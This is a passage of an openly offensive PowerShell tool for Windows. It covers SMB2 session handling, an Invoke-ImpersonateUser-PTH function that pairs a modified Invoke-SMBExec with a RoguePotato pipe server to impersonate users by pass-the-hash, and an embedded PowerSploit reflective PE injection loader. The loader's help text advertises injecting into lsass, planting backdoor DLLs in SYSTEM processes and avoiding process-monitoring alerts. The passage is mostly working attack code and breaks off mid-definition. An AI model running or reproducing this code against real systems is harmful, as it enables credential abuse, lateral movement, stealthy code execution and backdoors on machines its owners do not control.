                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                            $stage = 'SendReceive'
                        }

                        'SendReceive'
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }


                        'StatusPending'
                        {
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                            {
                                $stage = 'StatusReceived'
                            }
                            else{write-verbose "not received yet"}

                        }

                        'StatusReceived'
                        {

                            switch ($stage_current)
                            {

                                'CloseRequest'
                                {
                                    $stage = 'TreeDisconnect'
                                }

                                'CloseServiceHandle'
                                {

                                    if($SMB_close_service_handle_stage -eq 2)
                                    {
                                        $stage = 'CloseServiceHandle'
                                    }
                                    else
                                    {
                                        $stage = 'CloseRequest'
                                    }

                                }

                                'CreateRequest'
                                {
                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')
                                    {
                                        Write-Output "[+] Session refreshed"
                                        $stage = 'Exit'
                                    }
                                    elseif($stage -ne 'Exit')
                                    {
                                        $stage = 'TreeDisconnect' # changed from RPCBind
                                    }

                                }

                                'Logoff'
                                {
                                    $stage = 'Exit'
                                }


                                'ReadRequest'
                                {
                                    $stage = $stage_next
                                }


                                'TreeConnect'
                                {
                                    $tree_ID = $client_receive[40..43]
                                    $stage = 'CreateRequest'
                                }

                                'TreeDisconnect'
                                {

                                    if(!$Logoff)
                                    {
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $stage = 'Logoff'
                                    }

                                }

                            }

                        }
                    
                        'TreeConnect'
                        {
                            $tree_ID = $client_receive[40..43]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            Write-verbose "TreeConnect send!"
                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }
                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }
                            
                        }

                        'TreeDisconnect'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }
    
                    }
                
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }
        
        }

    }

}

}

function Invoke-ImpersonateUser-PTH
{
<#
.SYNOPSIS
Invoke-ImpersonateUser-PTH is a combination of a modified Invoke-SMBExec (https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) and a modified RoguePotato (https://github.com/antonioCoco/RoguePotato) Pipeserver
with the aim of User-Impersonation via PTH over a named pipe. Invoke-ReflectivePEInjection (https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) is used to load the Pipeserver from memory.

Author: Fabian Mosch (@shitsecure)
License: BSD 3-Clause

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER PipeName
The named pipe to access.

.PARAMETER Binary
The full path to an executable.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.


#>


[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target = "localhost",
    [parameter(Mandatory=$true)][String]$binary = "C:\windows\system32\cmd.exe",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$PipeName,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash

)

    @'
             
         __   ___  __   __   __            ___  ___       __   ___  __      __  ___      
|  |\/| |__) |__  |__) /__` /  \ |\ |  /\   |  |__  |  | /__` |__  |__) __ |__)  |  |__| 
|  |  | |    |___ |  \ .__/ \__/ | \| /~~\  |  |___ \__/ .__/ |___ |  \    |     |  |  | 
                                                                                         
                                               by @shitsecure
'@
start-Job -ScriptBlock {
param
(
    [String]$binary = "C:\windows\system32\cmd.exe",
    [String]$PipeName
)

function Invoke-PEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 

PowerSploit Function: Invoke-PEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-PEInjection more than once.
	
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-PEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-PEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-PEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
